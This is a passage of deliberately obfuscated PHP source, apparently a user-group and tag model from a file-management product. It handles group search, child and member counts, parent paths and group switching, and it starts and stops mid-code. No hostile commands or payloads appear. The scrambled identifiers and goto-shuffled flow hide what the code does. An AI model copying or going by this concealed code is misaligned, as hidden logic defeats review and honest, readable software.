fõ˜ŸŠÛØ÷: $cöòŸè«·Ô[$aÀİØ…ÕöÚ[362]][$aÀİØ…ÕöÚ[364]] = ceil($cöòŸè«·Ô[$aÀİØ…ÕöÚ[362]][$aÀİØ…ÕöÚ[363]] / $cöòŸè«·Ô[$aÀİØ…ÕöÚ[362]][$aÀİØ…ÕöÚ[359]]); goto A¤øŠ¼ºì; FãÀŠäñë½: $eÇó…¥ß¡ = $this->groupChildrenAll($bÓØùÔ§Òî); $D‹èÙ‚éªä = $this->_searchFromMeta($aÀİØ…ÕöÚ[437], $FÆÃË›‡Ê, 10, $eÇó…¥ß¡); $CÒÌª×·©× = $this->_searchFromMeta($aÀİØ…ÕöÚ[438], $FÆÃË›‡Ê, 10, $eÇó…¥ß¡); goto b‰¯¦àÔ; A¤øŠ¼ºì: } $this->_listDataApply($cöòŸè«·Ô[$aÀİØ…ÕöÚ[365]]); goto B†ëªã·À; c·•’–«Ğ‚: if (!trim($FÆÃË›‡Ê)) { return !1; } $FÆÃË›‡Ê = str_replace($aÀİØ…ÕöÚ[1750], $aÀİØ…ÕöÚ[1751], $FÆÃË›‡Ê); $d…í”„˜‰‹ = array($aÀİØ…ÕöÚ[1664] => array($aÀİØ…ÕöÚ[378], "{$FÆÃË›‡Ê}\x25"), $aÀİØ…ÕöÚ[28] => array($aÀİØ…ÕöÚ[378], "\45{$FÆÃË›‡Ê}\45"), $aÀİØ…ÕöÚ[932] => $aÀİØ…ÕöÚ[1752]); goto a¶ä§ÂéŒ; fë£¤éÙ‡º: } protected function groupChildrenAll($DîÅİ¹¸™ô) { $bÍİô„Õ‚‹ =& $_SERVER[Â€Á›¨õ]; if (!$DîÅİ¹¸™ô) { return !1; } if (is_string($DîÅİ¹¸™ô)) { $DîÅİ¹¸™ô = array($DîÅİ¹¸™ô); } $dÏí“Œ÷·‰ = $DîÅİ¹¸™ô; foreach ($DîÅİ¹¸™ô as $EŠºòÈŠœË) { $aöåŸŠ•Ûí = $this->getInfoSimple($EŠºòÈŠœË); $FĞğÑˆÆ = array($bÍİô„Õ‚‹[481] => array($bÍİô„Õ‚‹[378], $aöåŸŠ•Ûí[$bÍİô„Õ‚‹[481]] . $EŠºòÈŠœË . $bÍİô„Õ‚‹[508])); $fèÛ¡Ó…é = $this->field($bÍİô„Õ‚‹[1664])->where($FĞğÑˆÆ)->select(); $dÏí“Œ÷·‰ = array_merge($dÏí“Œ÷·‰, array_to_keyvalue($fèÛ¡Ó…é, $bÍİô„Õ‚‹[33], $bÍİô„Õ‚‹[1664])); } return array_unique($dÏí“Œ÷·‰); } private function _searchFromMeta($A†ÊÚ–, $C‡¹Šƒßé÷, $d•Àí‹öé, $F•Ó·‰ŒÔ½) { goto Bõƒ¬ğ¶õ; BÉì‚¼Ñ¼Œ: $dÇÇâ†½Ñ = $this->parseWhereLike($dÇÇâ†½Ñ); if ($F•Ó·‰ŒÔ½) { $dÇÇâ†½Ñ[$FšŒ„ŒÒÃ¬[1664]] = array($FšŒ„ŒÒÃ¬[7], $F•Ó·‰ŒÔ½); } $Bîãš™Ü„Ä = Model($FšŒ„ŒÒÃ¬[1753])->where($dÇÇâ†½Ñ)->limit($d•Àí‹öé)->select(); goto cÒôÃ´¤İá; cÒôÃ´¤İá: if (!$Bîãš™Ü„Ä) { return array(); } $Bîãš™Ü„Ä = array_to_keyvalue($Bîãš™Ü„Ä, $FšŒ„ŒÒÃ¬[33], $FšŒ„ŒÒÃ¬[1664]); $C­¯ø©²©— = $this->where(array($FšŒ„ŒÒÃ¬[1743] => array($FšŒ„ŒÒÃ¬[7], $Bîãš™Ü„Ä)))->select(); goto a«º¤ß™‚; a«º¤ß™‚: if (!$C­¯ø©²©—) { return array(); } return $C­¯ø©²©—; goto e„©µ—–œô; Bõƒ¬ğ¶õ: $FšŒ„ŒÒÃ¬ =& $_SERVER[Â€Á›¨õ]; $C‡¹Šƒßé÷ = strtolower($C‡¹Šƒßé÷); $dÇÇâ†½Ñ = array($FšŒ„ŒÒÃ¬[92] => $A†ÊÚ–, $FšŒ„ŒÒÃ¬[370] => array($FšŒ„ŒÒÃ¬[378], "\x25{$C‡¹Šƒßé÷}\x25")); goto BÉì‚¼Ñ¼Œ; e„©µ—–œô: } protected function _listDataApplyItem($e×‹İ‹Â•Í) { $AŸ»ï¨Û•» = array($e×‹İ‹Â•Í); $this->_listDataApply($AŸ»ï¨Û•»); return $AŸ»ï¨Û•»[0]; } protected function _listDataApply(&$a¬ˆÖâõÛ) { goto CˆšÍÇÈİç; CˆšÍÇÈİç: $CŒê°Àï³Ò =& $_SERVER[Â€Á›¨õ]; if (!$a¬ˆÖâõÛ) { return; } $Bâ†Ñ¯êÆø = array_to_keyvalue($a¬ˆÖâõÛ, $CŒê°Àï³Ò[33], $CŒê°Àï³Ò[1664]); goto C©Ûï«öÎ; dŒ›˜Á: $this->_listAppendParent($a¬ˆÖâõÛ); $this->_listAppendSourceRoot($a¬ˆÖâõÛ, $Bâ†Ñ¯êÆø); goto FğÖËÎòÊ; C©Ûï«öÎ: $this->_listAppendChildren($a¬ˆÖâõÛ); $this->_listAppendChildrenMember($a¬ˆÖâõÛ); $this->_listAppendMeta($a¬ˆÖâõÛ, $Bâ†Ñ¯êÆø); goto dŒ›˜Á; FğÖËÎòÊ: } private function _listAppendChildren(&$EÂØºô–¢Š) { goto A©’íÙ¯›; Eä•èŒÄÓ”: $e´É±øíÒŸ = array($fÏã®£ëàä[472], $fÏã®£ëàä[1754] => $fÏã®£ëàä[474]); $d×Ô¥ÀÚ´Ş = $this->field($e´É±øíÒŸ)->where($fŞ¥¨°²«Ü)->group($fÏã®£ëàä[472])->select(); $E‚êŸ£˜±Â = array_to_keyvalue($d×Ô¥ÀÚ´Ş, $fÏã®£ëàä[472], $fÏã®£ëàä[474]); goto CËŞ¦†“ÂÅ; CËŞ¦†“ÂÅ: foreach ($EÂØºô–¢Š as &$Dê«Õ™¤Ìˆ) { $Bàè…‹¶¢ñ = $Dê«Õ™¤Ìˆ[$fÏã®£ëàä[1664]]; $Dê«Õ™¤Ìˆ[$fÏã®£ëàä[1755]] = isset($E‚êŸ£˜±Â[$Bàè…‹¶¢ñ]) ? intval($E‚êŸ£˜±Â[$Bàè…‹¶¢ñ]) : !1; } unset($Dê«Õ™¤Ìˆ); goto e™ôÍÔÓ¢º; A©’íÙ¯›: $fÏã®£ëàä =& $_SERVER[Â€Á›¨õ]; $c‡¤”´¡ë = array_to_keyvalue($EÂØºô–¢Š, $fÏã®£ëàä[33], $fÏã®£ëàä[1664]); $fŞ¥¨°²«Ü = array($fÏã®£ëàä[472] => array($fÏã®£ëàä[7], $c‡¤”´¡ë)); goto Eä•èŒÄÓ”; e™ôÍÔÓ¢º: } private function _listAppendChildrenMember(&$cŒ˜˜× µÉ) { goto aÚ‹óãöõ±; b¦™¬›ä‚Í: foreach ($cŒ˜˜× µÉ as &$Fßä‰Ô¨êÂ) { $fêÇ°‡ºòî = $Fßä‰Ô¨êÂ[$F±¬œ÷¿‚Ô[1664]]; $Fßä‰Ô¨êÂ[$F±¬œ÷¿‚Ô[1756]] = isset($CÎªèĞ„ïå[$fêÇ°‡ºòî]) ? intval($CÎªèĞ„ïå[$fêÇ°‡ºòî]) : !1; } unset($Fßä‰Ô¨êÂ); goto B†¢óÍ¡š‰; A‡…•‚ğŠ: $FùÁ„ŒÄ = array($F±¬œ÷¿‚Ô[1664], $F±¬œ÷¿‚Ô[1754] => $F±¬œ÷¿‚Ô[474]); $b®ÉÆÍáåÔ = Model($F±¬œ÷¿‚Ô[1746])->field($FùÁ„ŒÄ)->where($eáĞŸË´¶º)->group($F±¬œ÷¿‚Ô[1664])->select(); $CÎªèĞ„ïå = array_to_keyvalue($b®ÉÆÍáåÔ, $F±¬œ÷¿‚Ô[1664], $F±¬œ÷¿‚Ô[474]); goto b¦™¬›ä‚Í; aÚ‹óãöõ±: $F±¬œ÷¿‚Ô =& $_SERVER[Â€Á›¨õ]; $E†§´ÄÍ¼² = array_to_keyvalue($cŒ˜˜× µÉ, $F±¬œ÷¿‚Ô[33], $F±¬œ÷¿‚Ô[1664]); $eáĞŸË´¶º = array($F±¬œ÷¿‚Ô[1664] => array($F±¬œ÷¿‚Ô[7], $E†§´ÄÍ¼²)); goto A‡…•‚ğŠ; B†¢óÍ¡š‰: } private function _listAppendMeta(&$B¡°Â´¤, $F¨‡ ½Î¥) { goto F¸ÑëÌßä•; aé¦˜¬Æ°Ù: foreach ($B¡°Â´¤ as &$c¹×ÕÂï Ù) { $c¹×ÕÂï Ù[$f‚«©¸áÀ„[439]] = array(); if (isset($E½ÏÊ·‹ğ¦[$c¹×ÕÂï Ù[$f‚«©¸áÀ„[1664]]])) { $c¹×ÕÂï Ù[$f‚«©¸áÀ„[439]] = $E½ÏÊ·‹ğ¦[$c¹×ÕÂï Ù[$f‚«©¸áÀ„[1664]]]; } } unset($c¹×ÕÂï Ù); goto CÔğğâè‚ò; F¸ÑëÌßä•: $f‚«©¸áÀ„ =& $_SERVER[Â€Á›¨õ]; $BŠ•ˆóÈßØ = array($f‚«©¸áÀ„[1664] => array($f‚«©¸áÀ„[7], $F¨‡ ½Î¥)); $E½ÏÊ·‹ğ¦ = Model($f‚«©¸áÀ„[1745])->where($BŠ•ˆóÈßØ)->select(); goto fÖØšáÆÁ†; fÖØšáÆÁ†: $E½ÏÊ·‹ğ¦ = array_to_keyvalue_group($E½ÏÊ·‹ğ¦, $f‚«©¸áÀ„[1664]); foreach ($E½ÏÊ·‹ğ¦ as &$cÑ¶õ‹ãï) { $cÑ¶õ‹ãï = array_to_keyvalue($cÑ¶õ‹ãï, $f‚«©¸áÀ„[92], $f‚«©¸áÀ„[370]); } unset($cÑ¶õ‹ãï); goto aé¦˜¬Æ°Ù; CÔğğâè‚ò: } protected function parentLevelArray($aÊçªö…”§) { $aª¯£Ò’ç =& $_SERVER[Â€Á›¨õ]; $aÊçªö…”§ = explode($aª¯£Ò’ç[47], trim($aÊçªö…”§, $aª¯£Ò’ç[47])); $aÊçªö…”§ = array_remove_value($aÊçªö…”§, $aª¯£Ò’ç[491]); return $aÊçªö…”§; } private function _listAppendParent(&$bäÔÔ÷‹Ëì) { goto F’ëÜË‘í; bËƒ¿éğ„: if ($GLOBALS[$BĞÖË„Íï[479]] == $BĞÖË„Íï[86]) { $aŸ„Ê½ˆâô = !1; } foreach ($bäÔÔ÷‹Ëì as &$bÏ®î‘æö) { $fÄÚÅ»ßâ = $this->parentLevelArray($bÏ®î‘æö[$BĞÖË„Íï[481]]); $cÃéãšÜ¸Õ = $BĞÖË„Íï[33]; foreach ($fÄÚÅ»ßâ as $EÀ¦ö©·ô– => $DÏŠ¤ŒÊò) { if ($aŸ„Ê½ˆâô && $EÀ¦ö©·ô– == 0) { continue; } $cÃéãšÜ¸Õ .= $A•…ãßÔ½š[$DÏŠ¤ŒÊò] . $BĞÖË„Íï[8]; } if ($fÄÚÅ»ßâ) { $cÃéãšÜ¸Õ .= $bÏ®î‘æö[$BĞÖË„Íï[28]]; } $bÏ®î‘æö[$BĞÖË„Íï[485]] = str_replace($BĞÖË„Íï[490], $BĞÖË„Íï[8], $cÃéãšÜ¸Õ); } unset($bÏ®î‘æö); goto fƒ‡šƒâãì; F’ëÜË‘í: $BĞÖË„Íï =& $_SERVER[Â€Á›¨õ]; $A•…ãßÔ½š = array(); foreach ($bäÔÔ÷‹Ëì as &$bÏ®î‘æö) { $A•…ãßÔ½š[$bÏ®î‘æö[$BĞÖË„Íï[1664]]] = $bÏ®î‘æö[$BĞÖË„Íï[28]]; $fÄÚÅ»ßâ = $this->parentLevelArray($bÏ®î‘æö[$BĞÖË„Íï[481]]); foreach ($fÄÚÅ»ßâ as $DÏŠ¤ŒÊò) { if (!isset($A•…ãßÔ½š[$DÏŠ¤ŒÊò])) { $A•…ãßÔ½š[$DÏŠ¤ŒÊò] = 0; } } } goto då–¬¯©; då–¬¯©: unset($bÏ®î‘æö); foreach ($A•…ãßÔ½š as $EÀ¦ö©·ô– => $cÛ¶¯ÎÌó) { if ($cÛ¶¯ÎÌó) { continue; } $CÇñº»®¦ = $this->getInfoSimple($EÀ¦ö©·ô–); $A•…ãßÔ½š[$EÀ¦ö©·ô–] = $CÇñº»®¦[$BĞÖË„Íï[28]]; } $aŸ„Ê½ˆâô = $GLOBALS[$BĞÖË„Íï[6]][$BĞÖË„Íï[87]][$BĞÖË„Íï[1757]]; goto bËƒ¿éğ„; fƒ‡šƒâãì: } private function _listAppendSourceRoot(&$bÄµºŠ¹Œ, $BÛÛùßĞìİ) { goto fï˜Ê²¶¸®; E³Ô¹Áµ: $B±è±•ª—‹ = Model($Bå—©™ßÖÛ[767])->order($Bå—©™ßÖÛ[1759])->field($c¡„•Æ†Ì)->where($dÒ•ë¼Ü‹)->select(); $B±è±•ª—‹ = array_to_keyvalue($B±è±•ª—‹, $Bå—©™ßÖÛ[478]); $B±è±•ª—‹ = array_remove_key($B±è±•ª—‹, $Bå—©™ßÖÛ[478]); goto dèøÜÒä…¨; fï˜Ê²¶¸®: $Bå—©™ßÖÛ =& $_SERVER[Â€Á›¨õ]; $dÒ•ë¼Ü‹ = array($Bå—©™ßÖÛ[398] => SourceModel::TYPE_GROUP, $Bå—©™ßÖÛ[472] => 0, $Bå—©™ßÖÛ[478] => array($Bå—©™ßÖÛ[7], $BÛÛùßĞìİ)); $c¡„•Æ†Ì = $Bå—©™ßÖÛ[1758]; goto E³Ô¹Áµ; dèøÜÒä…¨: foreach ($bÄµºŠ¹Œ as &$E¸›¤Ş‘½Å) { $E¸›¤Ş‘½Å[$Bå—©™ßÖÛ[84]] = $B±è±•ª—‹[$E¸›¤Ş‘½Å[$Bå—©™ßÖÛ[1664]]] ? $B±è±•ª—‹[$E¸›¤Ş‘½Å[$Bå—©™ßÖÛ[1664]]] : array(); } unset($E¸›¤Ş‘½Å); goto a³ØÕò ª; a³ØÕò ª: } protected function groupMerge($A ŞÉ§çÍÁ) { $A ŞÉ§çÍÁ = array_values(array_unique($A ŞÉ§çÍÁ)); $f¦äŠóãÜ = array(); for ($bœÁ³Ç‰— = 0; $bœÁ³Ç‰— < count($A ŞÉ§çÍÁ); $bœÁ³Ç‰—++) { $Aãõ¼““òÂ = !1; for ($e´‰éÙÃä = 0; $e´‰éÙÃä < count($A ŞÉ§çÍÁ); $e´‰éÙÃä++) { if ($bœÁ³Ç‰— == $e´‰éÙÃä) { continue; } if ($this->isParentOf($A ŞÉ§çÍÁ[$e´‰éÙÃä], $A ŞÉ§çÍÁ[$bœÁ³Ç‰—])) { $Aãõ¼““òÂ = !0; break; } } if (!$Aãõ¼““òÂ) { $f¦äŠóãÜ[] = $A ŞÉ§çÍÁ[$bœÁ³Ç‰—]; } } return $f¦äŠóãÜ; } protected function isParentOf($E§í×÷—ïØ, $fÅ±¢Øøß) { goto eË¿£«¼ºà; eË¿£«¼ºà: $e„§ÑÒÛ‡± =& $_SERVER[Â€Á›¨õ]; if (!$E§í×÷—ïØ || !$fÅ±¢Øøß || $E§í×÷—ïØ == $fÅ±¢Øøß) { return !1; } $DŒåÁÈ²… = $this->getInfoSimple($E§í×÷—ïØ); goto BŸ¹Ò”ƒä•; a¿˜ãÀæºˆ: return !1; goto Cˆ³±ä†‹à; BŸ¹Ò”ƒä•: $D½œÄã¸  = $this->getInfoSimple($fÅ±¢Øøß); $DÙš†Ã¢Í = $DŒåÁÈ²…[$e„§ÑÒÛ‡±[481]] . $E§í×÷—ïØ . $e„§ÑÒÛ‡±[47]; if (substr($D½œÄã¸ [$e„§ÑÒÛ‡±[481]], 0, strlen($DÙš†Ã¢Í)) == $DÙš†Ã¢Í) { return !0; } goto a¿˜ãÀæºˆ; Cˆ³±ä†‹à: } public function groupShowRoot($e…äÊ‡ùÚ©, $BâèØÛŞğ = false) { goto bŞ‰à­Ğãà; f÷¨²¬ˆøº: return $CøÑÈçˆíˆ; goto Eˆ¶ã‰óø¬; f›ö´Ô‡ğÃ: if ($BâèØÛŞğ && count($a¡®¯¦ñ) == 1) { return $CøÑÈçˆíˆ; } if (!$E‡åìççÁõ[$EĞâ­ç Îà[439]] || !isset($E‡åìççÁõ[$EĞâ­ç Îà[439]][$EĞâ­ç Îà[1741]]) || $E‡åìççÁõ[$EĞâ­ç Îà[439]][$EĞâ­ç Îà[1741]] == $EĞâ­ç Îà[1715]) { return $this->groupShowRoot($a¡®¯¦ñ[count($a¡®¯¦ñ) - 1], $BâèØÛŞğ); } if ($E‡åìççÁõ[$EĞâ­ç Îà[439]][$EĞâ­ç Îà[1741]] == $EĞâ­ç Îà[355]) { $dïŒäŒá¸ = explode($EĞâ­ç Îà[47], $E‡åìççÁõ[$EĞâ­ç Îà[439]][$EĞâ­ç Îà[1742]]); if ($dïŒäŒá¸) { $CøÑÈçˆíˆ = array_merge($CøÑÈçˆíˆ, $dïŒäŒá¸); } } goto f÷¨²¬ˆøº; däÅ¾¿êá™: $a¡®¯¦ñ = $this->parentLevelArray($E‡åìççÁõ[$EĞâ­ç Îà[481]]); $CøÑÈçˆíˆ = array($e…äÊ‡ùÚ©); if (count($a¡®¯¦ñ) == 0) { return $CøÑÈçˆíˆ; } goto f›ö´Ô‡ğÃ; bŞ‰à­Ğãà: $EĞâ­ç Îà =& $_SERVER[Â€Á›¨õ]; $E‡åìççÁõ = $this->getInfo($e…äÊ‡ùÚ©); if (!$E‡åìççÁõ) { return array(); } goto däÅ¾¿êá™; Eˆ¶ã‰óø¬: } protected function resetParentLevel() { $CÔ½’êà =& $_SERVER[Â€Á›¨õ]; $aºˆ¶¥–²Ã = $CÔ½’êà[1664]; $e³òèâ¦ = $this->select(); $e³òèâ¦ = array_to_keyvalue($e³òèâ¦, $aºˆ¶¥–²Ã); foreach ($e³òèâ¦ as $cŞ†Š­Ã·) { goto b®İÚç¸¸ë; fò§‡­‡ì: $this->where(array($aºˆ¶¥–²Ã => $cŞ†Š­Ã·[$aºˆ¶¥–²Ã]))->save(array($CÔ½’êà[548] => $eâÑİ©œ¶¢)); goto aâÎ±Ã®÷§; b®İÚç¸¸ë: $EÒ«¢³ÜŠö = $cŞ†Š­Ã·; $eâÑİ©œ¶¢ = array(); while ($EÒ«¢³ÜŠö[$CÔ½’êà[472]] != 0) { $eâÑİ©œ¶¢[] = $EÒ«¢³ÜŠö[$CÔ½’êà[472]]; $EÒ«¢³ÜŠö = $e³òèâ¦[$EÒ«¢³ÜŠö[$CÔ½’êà[472]]]; } goto c«„†Ÿà¾Ş; c«„†Ÿà¾Ş: $eâÑİ©œ¶¢[] = 0; $eâÑİ©œ¶¢ = $CÔ½’êà[47] . implode($CÔ½’êà[47], array_reverse($eâÑİ©œ¶¢)) . $CÔ½’êà[47]; $this->setNamePinyin($cŞ†Š­Ã·[$aºˆ¶¥–²Ã], $cŞ†Š­Ã·[$CÔ½’êà[28]]); goto fò§‡­‡ì; aâÎ±Ã®÷§: } return $e³òèâ¦; } public function groupNameAuto($c¢…Áº£ïô, $A¥·¡“‰¢) { $d‰™‡¸Æ¬ =& $_SERVER[Â€Á›¨õ]; $f™†¦…¸·š = $this->where(array($d‰™‡¸Æ¬[389] => $c¢…Áº£ïô))->getField($d‰™‡¸Æ¬[28], !0); if (!$f™†¦…¸·š || !in_array($A¥·¡“‰¢, $f™†¦…¸·š)) { return $A¥·¡“‰¢; } for ($BØùœÙã¡ = 1; $BØùœÙã¡ <= count($f™†¦…¸·š) + 1; $BØùœÙã¡++) { $C­Æ³çÂàĞ = $A¥·¡“‰¢ . "\x28{$BØùœÙã¡}\x29"; if (!in_array($C­Æ³çÂàĞ, $f™†¦…¸·š)) { return $C­Æ³çÂàĞ; } } } public function groupSwitch($F¢ÛÏ‰í×ì, $F¬˜Ù‘âåò) { goto c‚¡îµ‡ÉÀ; DÃ‡£÷ÒóŠ: $EŸğºÖÃÜ = !empty($E¶ãà˜ñŸ[$F¢ÛÏ‰í×ì]) ? $E¶ãà˜ñŸ[$F¢ÛÏ‰í×ì] : !1; if ($EŸğºÖÃÜ) { goto b Ãó‘«ç; b Ãó‘«ç: if (!$E¶ãà˜ñŸ[$F¬˜Ù‘âåò]) { $E¶ãà˜ñŸ[$F¬˜Ù‘âåò] = Model($EíÛÊÃº£“[767])->groupRootAdd($F¬˜Ù‘âåò); } $dˆÔ˜ø°¨« = $E¶ãà˜ñŸ[$F¬˜Ù‘âåò]; $DÔœßî„ = array($EíÛÊÃº£“[472] => $EŸğºÖÃÜ); goto b˜Š“Õß‡; F±íê‹ÀÑ¯: $C„Î§Ñ³Õ = array($EíÛÊÃº£“[478] => $F¬˜Ù‘âåò); Model($EíÛÊÃº£“[1763])->where($DÔœßî„)->save($C„Î§Ñ³Õ); Model($EíÛÊÃº£“[1764])->where($DÔœßî„)->save($C„Î§Ñ³Õ); goto B‘£»¦“é£; bª¼ì¸: foreach ($E¶ãà˜ñŸ as $f¬±±‚‰£) { $A¥î÷ò‘   = $f¬±±‚‰£[$EíÛÊÃº£“[397]] == $EíÛÊÃº£“[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($EíÛÊÃº£“[767])->move($f¬±±‚‰£[$EíÛÊÃº£“[390]], $dˆÔ˜ø°¨«, $A¥î÷ò‘  ); } Model($EíÛÊÃº£“[767])->moveClearAuth = !0; $DÔœßî„ = array($EíÛÊÃº£“[398] => 2, $EíÛÊÃº£“[478] => $F¢ÛÏ‰í×ì); goto F±íê‹ÀÑ¯; b˜Š“Õß‡: $E¶ãà˜ñŸ = Model($EíÛÊÃº£“[767])->where($DÔœßî„)->field($EíÛÊÃº£“[1762])->select(); if (!$E¶ãà˜ñŸ) { $E¶ãà˜ñŸ = array(); } Model($EíÛÊÃº£“[767])->moveClearAuth = !1; goto bª¼ì¸; B‘£»¦“é£: } $this->_changeChildLevel($a½§±£²Ûä[$F¢ÛÏ‰í×ì], $a½§±£²Ûä[$F¬˜Ù‘âåò], !0); goto AÁğ–î½è; c‚¡îµ‡ÉÀ: $EíÛÊÃº£“ =& $_SERVER[Â€Á›¨õ]; $DÔœßî„ = array($EíÛÊÃº£“[1664] => array($EíÛÊÃº£“[7], array($F¢ÛÏ‰í×ì, $F¬˜Ù‘âåò))); $a½§±£²Ûä = $this->where($DÔœßî„)->select(); goto D‹•ïŒåÍ»; D‹•ïŒåÍ»: $a½§±£²Ûä = array_to_keyvalue($a½§±£²Ûä, $EíÛÊÃº£“[1664]); if (!isset($a½§±£²Ûä[$F¢ÛÏ‰í×ì]) || !isset($a½§±£²Ûä[$F¬˜Ù‘âåò]) || $a½§±£²Ûä[$F¢ÛÏ‰í×ì][$EíÛÊÃº£“[472]] == 0) { return !1; } $DÔœßî„ = array($EíÛÊÃº£“[1664] => $F¢ÛÏ‰í×ì); goto a©Åá‘ÕŸ†; a©Åá‘ÕŸ†: $EŠµŞâ¿Ş· = Model($EíÛÊÃº£“[1746])->where($DÔœßî„)->select(); if (!$EŠµŞâ¿Ş·) { $EŠµŞâ¿Ş· = array(); } foreach ($EŠµŞâ¿Ş· as $e»ÚŞÈÇ²) { $c¼Ğƒ¦Ÿ£‚ = $e»ÚŞÈÇ²[$EíÛÊÃº£“[1501]]; $DÔœßî„ = array($EíÛÊÃº£“[1501] => $c¼Ğƒ¦Ÿ£‚, $EíÛÊÃº£“[1664] => $F¬˜Ù‘âåò); $Cçë§‡÷è = Model($EíÛÊÃº£“[1746])->where($DÔœßî„)->find(); if (!$Cçë§‡÷è) { $bÖ‡çÄ·ˆ = array($F¬˜Ù‘âåò => $e»ÚŞÈÇ²[$EíÛÊÃº£“[1760]]); Model($EíÛÊÃº£“[501])->userGroupAdd($c¼Ğƒ¦Ÿ£‚, $bÖ‡çÄ·ˆ); } Model($EíÛÊÃº£“[501])->userGroupRemove($c¼Ğƒ¦Ÿ£‚, $F¢ÛÏ‰í×ì); } goto b§ö¸‚Ì’; AÁğ–î½è: $this->where(array($EíÛÊÃº£“[472] => $F¢ÛÏ‰í×ì))->save(array($EíÛÊÃº£“[472] => $F¬˜Ù‘âåò)); return !0; goto dø»ëİ‹É; b§ö¸‚Ì’: $DÔœßî„ = array($EíÛÊÃº£“[398] => 2, $EíÛÊÃº£“[472] => 0, $EíÛÊÃº£“[397] => 1, $EíÛÊÃº£“[478] => array($EíÛÊÃº£“[7], array($F¢ÛÏ‰í×ì, $F¬˜Ù‘âåò))); $E¶ãà˜ñŸ = Model($EíÛÊÃº£“[767])->where($DÔœßî„)->field($EíÛÊÃº£“[1761])->select(); $E¶ãà˜ñŸ = array_to_keyvalue($E¶ãà˜ñŸ, $EíÛÊÃº£“[478], $EíÛÊÃº£“[390]); goto DÃ‡£÷ÒóŠ; dø»ëİ‹É: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($F“šø”÷¸œ) { $bˆ¬‘¡ö =& $_SERVER[Â€Á›¨õ]; return array($bˆ¬‘¡ö[1765] => array($F“šø”÷¸œ[0], $bˆ¬‘¡ö[1766]), $bˆ¬‘¡ö[1767] => array($F“šø”÷¸œ[0], $bˆ¬‘¡ö[1768])); } protected function get($DãšËÜù¾) { $D½µĞÏŠÂŒ =& $_SERVER[Â€Á›¨õ]; $DÎÑ³—İ”Ö = Model($D½µĞÏŠÂŒ[480])->metaGet($DãšËÜù¾, $D½µĞÏŠÂŒ[1769]); $CÔ£°Èö†¼ = json_decode($DÎÑ³—İ”Ö, !0); return $CÔ£°Èö†¼ ? $CÔ£°Èö†¼ : array($D½µĞÏŠÂŒ[1770] => $D½µĞÏŠÂŒ[86], $D½µĞÏŠÂŒ[365] => array()); } protected function set($D÷Ì÷èÃ•, $b‡·ï†‘ç‡) { $c„™„Ôçˆ =& $_SERVER[Â€Á›¨õ]; $b‡·ï†‘ç‡ = $b‡·ï†‘ç‡ ? $b‡·ï†‘ç‡ : array($c„™„Ôçˆ[1770] => $c„™„Ôçˆ[86], $c„™„Ôçˆ[365] => array()); Model($c„™„Ôçˆ[480])->metaSet($D÷Ì÷èÃ•, $c„™„Ôçˆ[1769], json_encode($b‡·ï†‘ç‡)); return Model($c„™„Ôçˆ[480])->metaSet($D÷Ì÷èÃ•, $c„™„Ôçˆ[1769], json_encode($b‡·ï†‘ç‡)); } protected function getByTagID($BØò¿¶ Å, $CÂÅ‘±‡Áõ) { goto E°’î¦õ¼ê; E°’î¦õ¼ê: $A××‚íÜê =& $_SERVER[Â€Á›¨õ]; if (!$BØò¿¶ Å || !$CÂÅ‘±‡Áõ) { return !1; } if (!Model($A××‚íÜê[480])->getInfoSimple($BØò¿¶ Å)) { return !1; } goto C»±ÜÍË³—; C¦Àİ…»†: return is_array($aÛ³Ã´‹¹) ? $aÛ³Ã´‹¹ : !1; goto EÚÑ®Ö—ëà; C»±ÜÍË³—: $bï­òÂöíğ = $this->get($BØò¿¶ Å); if (!$bï­òÂöíğ || !isset($bï­òÂöíğ[$A××‚íÜê[365]])) { return !1; } $aÛ³Ã´‹¹ = array_find_by_field($bï­òÂöíğ[$A××‚íÜê[365]], $A××‚íÜê[388], $CÂÅ‘±‡Áõ); goto C¦Àİ…»†; EÚÑ®Ö—ëà: } public function listSource($FáãŸ’ç÷, $b¾”•œ§Ÿà) { goto AêÙ®Ê¥Àµ; AêÙ®Ê¥Àµ: $b«Ïø£à =& $_SERVER[Â€Á›¨õ]; if ($b¾”•œ§Ÿà && !is_array($b¾”•œ§Ÿà)) { $b¾”•œ§Ÿà = array($b¾”•œ§Ÿà); } $CÑÅ¨åê‡î = $this->listData($FáãŸ’ç÷); goto FÔ­ÕŒ£¹ˆ; b†±Èº“Ü: if ($dà‘à˜¹İÓ) { $this->removeBySource($FáãŸ’ç÷, $dà‘à˜¹İÓ); } return $F‡ÀùŠé…”; goto F…ƒ¾„â¤¿; FÔ­ÕŒ£¹ˆ: $bî¬Ü‹›–‚ = array(); foreach ($CÑÅ¨åê‡î as $Dä®‚­ŠŒ‹) { $eÄ¸Ãù´ = $Dä®‚­ŠŒ‹[$b«Ïø£à[75]]; if (!$eÄ¸Ãù´) { continue; } if (!isset($bî¬Ü‹›–‚[$eÄ¸Ãù´])) { $bî¬Ü‹›–‚[$eÄ¸Ãù´] = array(); } $bî¬Ü‹›–‚[$eÄ¸Ãù´][] = $Dä®‚­ŠŒ‹[$b«Ïø£à[413]]; } $F«ìàÍ³¬› = array(); goto báâœö•½; báâœö•½: foreach ($bî¬Ü‹›–‚ as $E¤´òõšõ => $CÆÏÔ…£„‹) { $cØô¹‡¾… = !0; if (!$b¾”•œ§Ÿà) { $F«ìàÍ³¬›[] = $E¤´òõšõ; continue; } foreach ($b¾”•œ§Ÿà as $Bê×¾Œóİ) { if (!in_array($Bê×¾Œóİ, $CÆÏÔ…£„‹)) { $cØô¹‡¾… = !1; break; } } if ($cØô¹‡¾…) { $F«ìàÍ³¬›[] = $E¤´òõšõ; } } if (!$F«ìàÍ³¬›) { return array(); } $F‡ÀùŠé…” = Model($b«Ïø£à[1178])->listSource(array($b«Ïø£à[404] => array($b«Ïø£à[405], $F«ìàÍ³¬›))); goto d¯¼Ì×Éìƒ; d¯¼Ì×Éìƒ: if (!$F‡ÀùŠé…” || count($F«ìàÍ³¬›) == $F‡ÀùŠé…”[$b«Ïø£à[362]][$b«Ïø£à[363]]) { return $F‡ÀùŠé…”; } $dà‘à˜¹İÓ = array(); $bäâ§î · = array_to_keyvalue($F‡ÀùŠé…”[$b«Ïø£à[74]], $b«Ïø£à[33], $b«Ïø£à[390]); goto e”çßÓ‚µŒ; e”çßÓ‚µŒ: $c—¸ôÅàù³ = array_to_keyvalue($F‡ÀùŠé…”[$b«Ïø£à[73]], $b«Ïø£à[33], $b«Ïø£à[390]); $AŒñà‹Î¨ğ = 